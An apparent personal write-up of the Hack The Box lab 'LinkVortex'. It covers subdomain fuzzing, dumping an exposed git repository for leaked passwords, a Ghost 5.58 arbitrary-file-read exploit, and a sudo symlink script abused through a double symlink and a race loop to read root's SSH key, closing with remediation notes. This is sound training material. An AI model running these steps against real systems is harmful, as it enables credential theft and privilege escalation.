+++
date = '2026-06-12T19:40:40-04:00'
title = 'LinkVortex'
tags = ["htb", "easy", "git","sudo","race condition","symlink"]
+++

![](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/97f12db8fafed028448e29e30be7efac.png)

https://www.hackthebox.com/machines/LinkVortex
## OS: Linux
``` IP
10.129.231.194
```
## Credentials:

| Username               | Password                | Notes/Hash                              |
| ---------------------- | ----------------------- | --------------------------------------- |
| `admin@linkvortex.htb` | `OctopiFociPilfer45`    | leaked credential from `git` repository |
| `bob`                  | `fibber-talented-worth` | from arbitrary file read                |

---
## `nmap` results:
```
# Nmap 7.99 scan initiated Fri Jun 12 11:57:48 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/LinkVortex 10.129.231.194
Nmap scan report for 10.129.231.194
Host is up, received reset ttl 63 (0.018s latency).
Scanned at 2026-06-12 11:57:49 EDT for 21s
Not shown: 65466 closed tcp ports (reset), 67 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
80/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```
modify `/etc/hosts`:
```
echo "10.129.231.194 linkvortex.htb" >> /etc/hosts
```
then re-run `nmap` scan with default scripts on port 80 again:
```
# Nmap 7.99 scan initiated Fri Jun 12 11:59:42 2026 as: /usr/lib/nmap/nmap -p80 -sC -sV -vv -oA nmap/HTTPDefaultScan 10.129.231.194
Nmap scan report for linkvortex.htb (10.129.231.194)
Host is up, received reset ttl 63 (0.017s latency).
Scanned at 2026-06-12 11:59:43 EDT for 20s

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: POST GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: A9C6DBDCDC3AE568F4E0DAD92149A0E3
```

 
---
## Attack + Enum Vectors
- TCP 80: HTTP Apache
- TCP 22: SSH OpenSSH 8.9p1
### UDP (161 SNMP)?
- closed

---
## Service Enum Notes:
### Web Service: `Gobuster` / `fuff`
From the port 80 scan: we see `robots.txt` disallows the `/ghost/`, `/p/`, `/email/` and `/r/` directories, viewing them only `/ghost/` is viewable:
```
http://linkvortex.htb/ghost/#/signin
```
yields a log in page to `ghost`, if we `right click` the `orb` looking thing in the middle and click `Open Image in New Tab` yields:
```
https://static.ghost.org/v4.0.0/images/ghost-orb-2.png
```
reveals `v4.0.0`, and going on
```
https://ghost.org
```
we see that it's a web app, and I tried searching exploit online:
```
ghost 4 exploit site:github.com
```
didn't yield too interesting results

Let's enumerate subdomains:
```
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.linkvortex.htb" -u http://linkvortex.htb -fs 230
```
yields:
```
dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 30ms]
```
let's add that to our `/etc/hosts`, run `nikto`:
```
nikto -h http://dev.linkvortex.htb/
```
shows:
```
+ [006530] /.git/index: Git Index file may contain directory listing information.
```
we found a `.git`, potentially `git` repository?:
```
git-dumper http://dev.linkvortex.htb/.git git
```

`grep` password:
```
grep -Ri "password" .
```
got some passwords and hashes:
```
12345678
1234567890
Sl1m3rson99
jbloggs@example.com
onepassword
cdcdcdcdcd
1231111111
thisissupersafe
superSecure
OctopiFociPilfer45
lel123456
12345678910
1234abcde!!
qu33nRul35
```
```
$2a$10$we16f8rpbrFZ34xWj0/ZC.LTPUux8ler7bcdTs5qIleN6srRHhilG
$2a$10$FxFlCsNBgXw42cBj0l1GFu39jffibqTqyAGBz7uCLwetYAdBYJEe6
$2a$10$we16f8rpbrFZ34xWj0/ZC.LTPUux8ler7bcdTs5qIleN6srRHhilG
$2a$10$.pZeeBE0gHXd0PTnbT/ph.GEKgd0Wd3q2pWna3ynTGBkPKnGIKZL6
$2a$10$r0NpLiq8/.nzyxQrM96dI.JHyhx56MzsVv7xI6K4wzQDeR6gOAi3m
$2a$10$2bT2p18W82Z7BXAkrUfD..wIzN0kMKbgQrhCUg4d7t15QKof6z3qm
$2a$10$GKFu8wxSXZNFF/cEmTE0/O1FZIz5uRGwlLmYKRicdCRR.bvBeBsJa
$2a$10$bp1iRtUQ8GTbLyB/JMSXNuDB3ws9/3R8LrzGFvl5vrkO9rzdLRRru
$2a$10$.pZeeBE0gHXd0PTnbT/ph.GEKgd0Wd3q2pWna3ynTGBkPKnGIKABC
$2a$10$RNe7QWV3Ure9N9LLZ78bpuywaUeBD4gcF1OiU5e6X6yT7GYGu1Ri.
$2a$10$3je0L5wXdeXsCCvwmcfojuqUTSYVxj/i6uM7FscWsx6pz8p0rcvwy
```
Okay now how do we get further access? Or am I in a rabbit hole again.

On `http://linkvortex.htb/ghost/#/signin`: if we tried
```
test@linkvortex.htb
```
then yields
```
There is no user with that email address.
```

However, if we tried:
```
admin@linkvortex.htb
```
then yields:
```
Your password is incorrect.
```
And let's try the passwords we noted one by one since I am stuck, hopefully I am not in a rabbithole... Luckily `admin@linkvortex.htb:OctopiFociPilfer45` got in!

---
## Initial Foothold
`Gear button` -> `About Ghost` shows version is actually:
```
Version: 5.58.0
```
let's google that:
```
ghost 5.58 exploit
```
we found:
```
https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028
```
cloning it and running the exploit:
```
./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb/
```
then:
```
/etc/passwd
```
yields:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                      
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```
And trying the password for `node` from `ssh` produced non-interesting results

I got stuck here, and don't really know which file to read, referring to [0xdf](https://0xdf.gitlab.io/2025/04/12/htb-linkvortex.html#git-repo) writeup we know that we could've gotten the information from `git status` to know files to look for; in this case `git status` from `git` is `Dockerfile.ghost` and shows:
```
cat Dockerfile.ghost
```
shows:
```
FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

# Prevent installing packages
RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb

# Wait for the db to be ready first
COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
COPY entry.sh /entry.sh
RUN chmod +x /var/lib/ghost/wait-for-it.sh
RUN chmod +x /entry.sh

ENTRYPOINT ["/entry.sh"]
CMD ["node", "current/index.js"]
```
and viewing the file `/var/lib/ghost/config.production.json` from exploit:
```
File content:
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```
now try `ssh` with `bob:fibber-talented-worth`

And we got a `ssh` session as `bob`!

---
## Priv Esc
```
sudo -l
```
shows:
```
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```
let's view the scripts:
```
cat /opt/ghost/clean_symlink.sh
```
```
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

Assume: the script checks if `CHECK_CONTENT` is set, else set it to false. Then it take the first argument and define as `LINK`, and sees if it is ending in `.png`.

Then it uses `test -L` to check if it is actually a `symlink`, if not then the script just doesn't do anything. Then it stores the `symlink` file name as `LINK_NAME`, and stores the `symlink`'s "linked" location full path into `LINK_TARGET` variable. And if the `LINK_TARGET` contains `etc` or `root`, then the script will remove the `symlink` and terminate.

If the script passes the whole checks, it will move it to the quarantine directory. Then, if `CHECK_CONTENT == true`, it will print out the content of the file.

I first thought about exploiting the `mv` command maybe I can move a modified `/etc/passwd` to replace the actual `/etc/passwd`, but I don't think this is possible.

Then I looked at hints from HTB: `What is the full path of the SSH private key file for the root user?` which is ofcourse in `/root/.ssh`

Then I probably need to read the file some how: first I thought about how to bypass the `symlink` filter: I did `/roo?/.ssh/id_rsa` which actually bypassed the filter on my kali: but it didn't work when I am trying to read the `id_rsa` file:
```
ln -sf /roo?/.ssh/id_rsa test.png
```
then
```
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh test.png
```
didn't read file, and just nothing.

I did some digging around, appearantly I had to set `CHECK_CONTENT=true`, but also had to `export` it instead of just setting `CHECK_CONTENT=true`:
```
export CHECK_CONTENT=true
```
this is because exporting it sets the environmental variable instead of shell

Trying it again:
```
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh test.png
```
didn't actually yield anything..?

From [0xdf](https://0xdf.gitlab.io/2025/04/12/htb-linkvortex.html#shell-as-root) we see that he used `double symlink` to bypass the `readlink` check:
```
ln -sf /root/.ssh/id_rsa id_rsa.png
```
then:
```
ln -sf id_rsa.png a.png
```
and using `sudo`:
```
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh a.png
```
Also didn't work..? I am guessing I need to add absolute path?
```
ln -sf /home/bob/id_rsa.png a.png
```
then:
```
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh a.png
```
Great! we see the `id_rsa` key now, re-do it again:
```
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh a.png
```
```
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh a.png > id_rsa
```
make sure the permissions of the private key is correct:
```
chmod 400 id_rsa
```
then:
```
ssh root@localhost -i id_rsa
```
and we got root `ssh` session!

Therefore, pwn'd.

---
## Conclusion & Remediation
The initial access in this box required deep enumeration that challenges people's enumeration skill and methodologies. The privilege escalation also required strong linux understanding to abuse `symlink` for our privilege escalation purpose. I wouldn't say it's the most challenging or best designed box, but it for sure taught me interesting and important concepts.

To remediate for similar attacks in this lab: system administrators needs to make sure their `git` repositories are not leaked which could contain their credentials that may give attackers access to their servers. In addition, misconfigured `sudo` scripts needs to be removed to follow the principle of least privileges or at the very least remove the ability to read file contents from scripts with `sudo` privileges.
## More Digging:
[0xdf](https://0xdf.gitlab.io/2025/04/12/htb-linkvortex.html#shell-as-root) mentioned how the intended way was through a `TOCTOU` attack? A race condition? I have learned this when I was studying for the `CompTIA Security+` exam, but I've never utilized it in a lab or on real life scenerio, essentially we set up a `bash while infinite loop` on another `ssh` session as `bob`:
```
while true; do ln -sf /root/.ssh/id_rsa /var/quarantined/test.png ; done
```
and we create a symlink to read any file:
```
ln -sf /home/bob/user.txt /home/bob/test.png
```
now to trigger:
```
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh test.png
```
will retrun the `id_rsa`. However, how does this happen?

Let me first try to do without while loop:
```
ln -sf /root/.ssh/id_rsa /var/quarantined/test.png 
```
```
ln -sf /home/bob/user.txt /home/bob/test.png
```
```
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh test.png
```
returns the `user` flag... So what makes the difference?

The script first:
```
if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi
```
checks that we passed a `.png`, this is the same for both scenerios:

Then processes:
```
if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
```
This is also the same: it basically analyzes our `test.png`

And checks for our `symlink`
```
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
```
which will pass since our `symlink` is linked to `user.txt`

So the race condition probably occurs here:
```
/usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
```
What happens here is: first our `symlink`: `/home/bob/test.png` gets moved to `/var/quarantined/` and moved as: `/var/quarantined/test.png`

This is where the race condition happens, since our other shell as `bob` is running the while loop to link `/root/.ssh/id_rsa` to `/var/quarantined/test.png` and:

Rightg after our original `/home/bob/test.png` moves to `/var/quarantined/test.png`, it gets replaced by our `/var/quarantined/test.png` linked to `/root/.ssh/id_rsa`. Which achieves the same effect as bypassing all of the above checks in a script: especially the one that checks if it's linked with the keywords `root` or `etc`.

Then it follows to:
```
/usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
```
that will print out our desired file to screen

After a deep analysis, I have more understanding of how race conditions work now. I think there are a few ways how system administrators could prevent this, in this scenerio the easiest fix would be to prevent any user to writing to the `/var/quarantined` directory, but only `root` should be able to write to it. Even then, the `double symlink` trick should be able to bypass. Therefore, the best to `cat` the content first before moving it.